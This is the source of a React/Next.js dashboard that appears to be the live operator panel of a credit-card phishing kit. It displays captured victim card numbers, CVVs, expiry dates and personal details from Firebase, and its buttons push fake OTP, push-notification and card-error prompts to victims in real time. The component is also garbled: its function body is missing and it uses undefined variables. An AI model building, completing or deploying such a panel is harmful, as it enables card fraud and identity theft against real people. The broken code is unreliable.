"use client";

import { useEffect, useState, useRef } from "react";
import { useParams } from "next/navigation";
import { ref, onValue, update } from "firebase/database";
import { db } from "@/lib/firebase";
import {
    Smartphone, Monitor, CreditCard, Bell, CheckCircle, XCircle,
    Lock, MapPin, Globe, Clock, Terminal, Shield, MessageSquare
} from "lucide-react";
import CardVisual from "@/components/CardVisual";

interface SessionData {
    id: string;
    ip: string;
    ua: string;
    device: string;
    card?: string;
    name?: string;
    cvv?: string;
    expiry?: string;
    email?: string;
    phone?: string;
    address?: string;
    city?: string;
    state?: string;
    zip?: string;
    delivery?: string;
    status: "active" | "success" | "failed";
    lastActive: number;
    currentLocation?: string;
    logs: LogEntry[];
}

interface LogEntry {
    id: string;
    type: "info" | "input" | "otp" | "error" | "success";
    message: string;
    timestamp: number;
}

export default function LivePanel() {
}, [selectedSession?.logs]);

if (!selectedSession) return <div className="bg-[#0f111a] h-screen text-white flex items-center justify-center">Loading...</div>;

return (
    <div className="flex h-screen bg-[#0b0e14] text-gray-300 font-sans overflow-hidden">

        {/* LEFT COLUMN: Browser Info */}
        <div className="w-80 bg-[#11141d] border-r border-white/5 flex flex-col">
            <div className="p-4 border-b border-white/5 bg-[#161b26]">
                <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                    <Globe className="w-4 h-4" /> Browser Info
                </h2>
            </div>
            <div className="p-4 space-y-6 overflow-y-auto flex-1">

                {/* User Agent */}
                <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">User Agent</label>
                    <div className="bg-[#0b0e14] p-3 rounded border border-white/5 text-xs font-mono break-words text-gray-400">
                        {selectedSession.ua}
                    </div>
                </div>

                {/* IP & Country */}
                <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">IP & Country</label>
                    <div className="flex items-center gap-2">
                        <div className="h-2 w-2 rounded-full bg-green-500 animate-pulse"></div>
                        <span className="text-white font-mono">{selectedSession.ip}</span>
                        <span className="text-xs bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">US</span>
                    </div>
                </div>

                {/* Timezone */}
                <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">Timezone</label>
                    <div className="flex items-center gap-2 text-sm">
                        <Clock className="w-4 h-4 text-gray-500" />
                        <span>America/New_York (EST)</span>
                    </div>
                </div>

                {/* Screen Size */}
                <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">Screen Size</label>
                    <div className="flex items-center gap-2 text-sm">
                        <Monitor className="w-4 h-4 text-gray-500" />
                        <span>390 x 844 (Mobile)</span>
                    </div>
                </div>

                {/* Platform */}
                <div className="space-y-2">
                    <label className="text-xs font-bold text-gray-500 uppercase">Platform / CPU</label>
                    <div className="flex items-center gap-2 text-sm">
                        <Smartphone className="w-4 h-4 text-gray-500" />
                        <span>iPhone / iOS 16.0</span>
                    </div>
                </div>

            </div>
        </div>

        {/* CENTER COLUMN: Chat Box (Event Log) */}
        <div className="flex-1 flex flex-col bg-[#0b0e14] relative">
            <div className="p-4 border-b border-white/5 bg-[#11141d] flex justify-between items-center">
                <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                    <MessageSquare className="w-4 h-4" /> Chat Box (Live Events)
                </h2>
                <div className="flex items-center gap-2 text-xs">
                    <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
                    <span className="text-green-400">Connected</span>
                </div>
            </div>

            {/* Chat Area */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4">
                {selectedSession.logs.map((log) => (
                    <div key={log.id} className={`flex ${log.type === 'input' ? 'justify-end' : 'justify-start'}`}>
                        <div className={`max-w-[80%] rounded-lg p-3 text-sm ${log.type === 'input'
                            ? 'bg-blue-600/20 border border-blue-500/30 text-blue-100'
                            : log.type === 'otp'
                                ? 'bg-yellow-600/20 border border-yellow-500/30 text-yellow-100'
                                : 'bg-[#161b26] border border-white/5 text-gray-300'
                            }`}>
                            <div className="flex items-center gap-2 mb-1 opacity-50 text-[10px] uppercase tracking-wider">
                                {log.type === 'input' ? <Terminal className="w-3 h-3" /> : <Shield className="w-3 h-3" />}
                                <span>{new Date(log.timestamp).toLocaleTimeString()}</span>
                            </div>
                            <div>{log.message}</div>
                        </div>
                    </div>
                ))}
                <div ref={chatEndRef} />
            </div>

            {/* Action Bar */}
            <div className="p-4 bg-[#11141d] border-t border-white/5">
                <div className="grid grid-cols-4 gap-3">
                    <button
                        onClick={() => sendCommand("OTP")}
                        className="bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        Trigger OTP
                    </button>
                    <button
                        onClick={() => sendCommand("PUSH")}
                        className="bg-purple-600/20 hover:bg-purple-600/30 text-purple-400 border border-purple-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        Push Notif
                    </button>
                    <button
                        onClick={() => sendCommand("SUCCESS")}
                        className="bg-green-600/20 hover:bg-green-600/30 text-green-400 border border-green-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        End Success
                    </button>
                    <button
                        onClick={() => sendCommand("FAIL")}
                        className="bg-red-600/20 hover:bg-red-600/30 text-red-400 border border-red-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        End Failed
                    </button>
                </div>
                <div className="grid grid-cols-4 gap-3 mt-3">
                    <button
                        onClick={() => sendCommand("OTP_ERROR")}
                        className="bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-400 border border-yellow-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        OTP Error
                    </button>
                    <button
                        onClick={() => sendCommand("CARD_ERROR")}
                        className="bg-orange-600/20 hover:bg-orange-600/30 text-orange-400 border border-orange-500/30 py-3 rounded font-bold text-xs uppercase tracking-wider transition-all"
                    >
                        Card Error
                    </button>
                </div>
            </div>
        </div>

        {/* RIGHT COLUMN: Live Mirror */}
        <div className="w-96 bg-[#11141d] border-l border-white/5 flex flex-col">
            <div className="p-4 border-b border-white/5 bg-[#161b26]">
                <h2 className="text-xs font-bold uppercase tracking-widest text-blue-400 flex items-center gap-2">
                    <CreditCard className="w-4 h-4" /> Live Mirror
                </h2>
            </div>

            <div className="p-6 space-y-8 overflow-y-auto flex-1">

                {/* Card Visual */}
                <div className="relative group">
                    <div className="absolute -inset-1 bg-gradient-to-r from-blue-600 to-purple-600 rounded-2xl blur opacity-20 group-hover:opacity-40 transition duration-1000"></div>
                    <div className="relative">
                        <CardVisual
                            cardNumber={selectedSession.card || ""}
                            cardHolder={selectedSession.name || ""}
                            expiry={selectedSession.expiry || ""}
                            cvv={selectedSession.cvv || ""}
                        />
                    </div>
                </div>

                {/* Captured Data Table */}
                <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden">
                    <div className="px-4 py-3 border-b border-white/5 bg-[#161b26] flex justify-between items-center">
                        <span className="text-xs font-bold text-gray-500 uppercase">Captured Fields</span>
                        <span className="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-0.5 rounded">Live</span>
                    </div>
                    <div className="divide-y divide-white/5">
                        {[
                            { label: "Email", value: selectedSession.email },
                            { label: "Phone", value: selectedSession.phone },
                            { label: "Name", value: selectedSession.name },
                            { label: "Address", value: selectedSession.address },
                            { label: "City/State", value: `${selectedSession.city}, ${selectedSession.state} ${selectedSession.zip}` },
                            { label: "Delivery", value: selectedSession.delivery?.toUpperCase() },
                        ].map((item, i) => (
                            <div key={i} className="px-4 py-3 flex flex-col gap-1">
                                <span className="text-[10px] text-gray-500 uppercase tracking-wider">{item.label}</span>
                                <span className="text-sm text-gray-200 font-mono break-all">{item.value || "---"}</span>
                            </div>
                        ))}
                    </div>
                </div>

                {/* 3D Secure Preview */}
                <div className="bg-[#0b0e14] rounded-xl border border-white/5 overflow-hidden opacity-50">
                    <div className="px-4 py-3 border-b border-white/5 bg-[#161b26]">
                        <span className="text-xs font-bold text-gray-500 uppercase">3D Secure State</span>
                    </div>
                    <div className="p-4 text-center">
                        <div className="text-xs text-gray-500 mb-2">Waiting for trigger...</div>
                        <div className="w-full h-2 bg-[#161b26] rounded-full overflow-hidden">
                            <div className="h-full bg-blue-600 w-0"></div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

    </div>
);
}
